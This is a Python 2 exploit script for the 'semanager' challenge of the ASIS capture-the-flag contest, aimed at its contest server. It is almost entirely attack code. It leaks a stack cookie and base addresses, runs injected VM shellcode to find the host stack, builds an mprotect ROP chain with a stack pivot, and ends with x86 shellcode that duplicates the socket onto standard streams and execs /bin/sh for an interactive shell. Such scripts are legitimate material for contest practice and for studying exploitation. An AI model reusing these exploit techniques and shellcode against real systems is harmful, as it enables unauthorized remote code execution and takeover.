import socket
import time
import telnetlib
import struct
import sys
# from https://github.com/niklasb/ctf-tools/tree/master/pwnlib
import pwnlib.tools as t

#TARGET=('localhost', 9797)
TARGET=('semanager.asis-ctf.ir', 9797)

s=None
def connect():
    global s
    if s is not None:
        s.close()
    s=socket.create_connection(TARGET)

def ru(st):
    buf=''
    while not st in buf:
        c=s.recv(1)
        assert c
        buf += c
    return buf

def interact():
    t = telnetlib.Telnet()
    t.sock=s
    t.interact()

def p(x):
    return struct.pack('<I', x&0xffffffff)

def u(x):
    return struct.unpack('<I', x)[0]

# Step 1: Leak cookie, VM stack pointer and VM image base
connect()
ru('choice> ')
s.sendall('a\n')
leak = s.recv(0x108)
cookie = leak[-16:-12]
bp = u(leak[-8:-4])

base = u(leak[-4:]) - 0x10ce

print 'cookie = %s' % repr(cookie)
print 'bp = 0x%x' % bp
print 'base = 0x%x' % base

# Step 2: Return to stack and execute VM shellcode that leaks the stack location
# of the host process
ret_location = bp + (0x00a80ff8 - 0xa81ffc) + base

payload = 'a'*(0x108-16)
payload += cookie
payload += 'AAAA'
payload += 'BBBB'  # saved bp

payload += p(ret_location + 4)

# mov r0, 0x080ee644-base
payload += '\x00\x04\x05\x00' + p(0x080ee644-base)
# mov r0, [r0]
payload += '\x00\x01\x02\x00\x00'
# add r0, 0x34-base
payload += '\x01\x04\x05\x00' + p(0x34-base)
# mov r0, [r0]
payload += '\x00\x01\x02\x00\x00'
# push string 'FUUU'
payload += '\x0a\x00\x01\x00'
# push string 'FUUU'
payload += '\x0a\x01\x04' + 'FUUU'
# mov r0, 0x4
payload += '\x00\x04\x05\x00' + p(4)
# mov r1, r7
payload += '\x00\x00\x02\x01\x07'
# mov r2, rsp
payload += '\x00\x00\x02\x02\x09'
# mov r3, 0x12
payload += '\x00\x04\x05\x03' + p(12)
# syscall
payload += '\x0d\x00\x00'

payload += 'sssssssss'

connect()
ru('choice> ')
s.sendall(payload)
ru('FUUU')
ru('FUUU')
real_stack = u(s.recv(4))
print 'real_stack = 0x%08x' % real_stack

# Step 3: Write an mprotect ROP payload to the stack and overwrite ret addr of
# insn_mov with a pivoting gadget
def write(addr, value):
    #print 'write(addr=0x%08x, value=0x%08x)' % (addr, value)
    res = ''
    res += '\x00\x24\x08'
    res += p((addr - base) & 0xffffffff)
    res += p(value)
    return res

# shellcode
payload = t.x86.assemble("""
    mov ebx, 6
    ; assume that socket fd is in ebx
    push 0x2
    pop ecx
    ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
duploop:
    mov al, 0x3f
    int 0x80
    dec ecx
    jns duploop

    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
    """)

pad = 0x108-16
assert len(payload) <= pad
payload += 'a'*(pad-len(payload))
payload += cookie
payload += 'AAAA'
payload += 'BBBB'  # saved bp

payload += p(ret_location + 4)

rop_location = real_stack + (0xff8b57ac - 0xff8b57d8)
sc_location = ret_location + (0xf71f5ef4 - 0xf71f5ff8)

print 'sc_location = 0x%08x' % sc_location
rop = [
    0x0806fec0,  # mprotect
    sc_location,
    sc_location & ~0xfff,
    0x2000,
    7,
]
for i, x in enumerate(rop):
    payload += write(rop_location + 32 + 4*i, x)
payload += write(rop_location, 0x0804886c)

payload += 'ENDOFPAYLOAD'

connect()
ru('choice> ')
s.sendall(payload)
ru('ENDOFPAYLOAD')
print '[*] Enjoy your shell :)'
interact()
